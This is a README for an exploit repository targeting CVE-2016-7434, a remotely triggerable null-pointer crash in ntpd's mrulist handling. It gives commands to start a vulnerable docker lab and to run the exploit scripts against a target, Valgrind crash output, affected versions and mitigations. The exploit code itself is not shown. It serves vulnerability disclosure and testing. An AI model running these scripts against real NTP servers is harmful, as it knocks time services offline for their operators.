# CVE-2016-7434 ntpd DOS exploit
[![Docker Pulls](https://img.shields.io/docker/pulls/vulnerables/cve-2016-7434.svg?style=plastic)](https://hub.docker.com/r/vulnerables/cve-2016-7434/)

Ntpd suffer from a null pointer reference which is possible to trigger to crash the application. According to NTP.org, "If ntpd is configured to allow mrulist query requests from a server that sends a crafted malicious packet, ntpd will crash on receipt of that crafted malicious mrulist query packet."

The ntpd program is an operating-system daemon that sets and maintains a computer system's system time in synchronization with Internet-standard time servers. It is a complete implementation of the Network Time Protocol (NTP) version 4, but retains compatibility with versions 1, 2, and 3. 

The routine that reads the MRU list (```read_mru_list```) can be found [here](https://github.com/opsxcq/exploit-CVE-2016-7434/blob/d0a66022701b38a76991ccf1816ce4ebfdb701ec/ntp-4.2.8p8/ntpd/ntp_control.c#L3952), and [here is the line where the exception occurs](https://github.com/opsxcq/exploit-CVE-2016-7434/blob/d0a66022701b38a76991ccf1816ce4ebfdb701ec/ntp-4.2.8p8/ntpd/ntp_control.c#L4041)

# Exploit

## Vulnerable Image

If you want a vulnerable system to test this exploit, you can use docker to create it

    docker run --rm -it --name ntpvulnerable -p 123:123/udp vulnerables/cve-2016-7434 

It will start a docker container with a vulnerable ntpd, so you will be able to exploit it.

## python

    ./exploit.py -t <target ip> -p <target port>

## bash

    ./exploit.sh <target ip> <target port>

## Exploiting the bug

If you choose to run your exploit against your docker container, after the exploitation it will show the result bellow:

```
==1== Memcheck, a memory error detector
==1== Copyright (C) 2002-2013, and GNU GPL'd, by Julian Seward et al.
==1== Using Valgrind-3.10.0 and LibVEX; rerun with -h for copyright info
==1== Command: /src/ntpd/ntpd -n -c /ntp.conf
==1== 
22 Nov 23:59:27 ntpd[1]: ntpd 4.2.8p8@1.3265 Tue Nov 22 23:28:13 UTC 2016 (1): Starting
22 Nov 23:59:27 ntpd[1]: Command line: /src/ntpd/ntpd -n -c /ntp.conf
22 Nov 23:59:27 ntpd[1]: Cannot set RLIMIT_MEMLOCK: Operation not permitted
22 Nov 23:59:27 ntpd[1]: proto: precision = 4.680 usec (-18)
22 Nov 23:59:27 ntpd[1]: switching logging to file /dev/null
22 Nov 23:59:27 ntpd[1]: Listen and drop on 0 v6wildcard [::]:123
22 Nov 23:59:27 ntpd[1]: Listen and drop on 1 v4wildcard 0.0.0.0:123
22 Nov 23:59:27 ntpd[1]: Listen normally on 2 lo 127.0.0.1:123
22 Nov 23:59:27 ntpd[1]: Listen normally on 3 eth0 172.17.0.2:123
22 Nov 23:59:27 ntpd[1]: Listen normally on 4 lo [::1]:123
22 Nov 23:59:27 ntpd[1]: Listen normally on 5 eth0 [fe80::42:acff:fe11:2%13]:123
22 Nov 23:59:27 ntpd[1]: Listening on routing socket on fd #22 for interface updates
22 Nov 23:59:28 ntpd[1]: start_kern_loop: ntp_loopfilter.c line 1118: ntp_adjtime: Operation not permitted
22 Nov 23:59:28 ntpd[1]: set_freq: ntp_loopfilter.c line 1081: ntp_adjtime: Operation not permitted
==1== Invalid read of size 1
==1==    at 0x4C2C1A2: strlen (vg_replace_strmem.c:412)
==1==    by 0x44EB2D: estrdup_impl (emalloc.c:128)
==1==    by 0x4192D9: read_mru_list (ntp_control.c:4041)
==1==    by 0x423FC1: receive (ntp_proto.c:659)
==1==    by 0x412D5F: ntpdmain (ntpd.c:1329)
==1==    by 0x4042B8: main (ntpd.c:392)
==1==  Address 0x0 is not stack'd, malloc'd or (recently) free'd
==1== 
==1== 
==1== Process terminating with default action of signal 11 (SIGSEGV): dumping core
==1==  Access not within mapped region at address 0x0
==1==    at 0x4C2C1A2: strlen (vg_replace_strmem.c:412)
==1==    by 0x44EB2D: estrdup_impl (emalloc.c:128)
==1==    by 0x4192D9: read_mru_list (ntp_control.c:4041)
==1==    by 0x423FC1: receive (ntp_proto.c:659)
==1==    by 0x412D5F: ntpdmain (ntpd.c:1329)
==1==    by 0x4042B8: main (ntpd.c:392)
==1==  If you believe this happened as a result of a stack
==1==  overflow in your program's main thread (unlikely but
==1==  possible), you can try to increase the size of the
==1==  main thread stack using the --main-stacksize= flag.
==1==  The main thread stack size used in this run was 204800.
==1== 
==1== HEAP SUMMARY:
==1==     in use at exit: 31,476 bytes in 149 blocks
==1==   total heap usage: 313 allocs, 164 frees, 310,744 bytes allocated
==1== 
==1== LEAK SUMMARY:
==1==    definitely lost: 0 bytes in 0 blocks
==1==    indirectly lost: 0 bytes in 0 blocks
==1==      possibly lost: 2,000 bytes in 2 blocks
==1==    still reachable: 29,476 bytes in 147 blocks
==1==         suppressed: 0 bytes in 0 blocks
==1== Rerun with --leak-check=full to see details of leaked memory
==1== 
==1== For counts of detected and suppressed errors, rerun with: -v
==1== ERROR SUMMARY: 1 errors from 1 contexts (suppressed: 0 from 0)

valgrind: the 'impossible' happened:
   main(): signal was supposed to be fatal

   host stacktrace:
   ==1==    at 0x380A48EF: show_sched_status_wrk (m_libcassert.c:319)

   sched status:
     running_tid=1

```
# Vulnerable versions

 * 4.3.90 
 * 4.3.25 
 * 4.3 
 * 4.3.93
 * 4.3.92
 * 4.3.77
 * 4.3.70
 * 4.2.8p8
 * 4.2.8p7
 * 4.2.8p6
 * 4.2.8p5
 * 4.2.8p4
 * 4.2.8p3
 * 4.2.8p2
 * 4.2.8p1
 * 4.2.7p22

# Not Vulnerable:

 * 4.3.94
 * 4.2.8p9

# Mitigation

 * Only allow mrulist query packets from trusted hosts.
 * Implement BCP-38.
 * Upgrade to 4.2.8p9.
 * Properly monitor your ntpd instances, and auto-restart ntpd (without -g) if it stops running.

### Disclaimer

This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (opsxcq) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not opsxcq's responsibility.

# Credits

Magnus Klaaborg Stubman (@magnusstubman) found this flaw
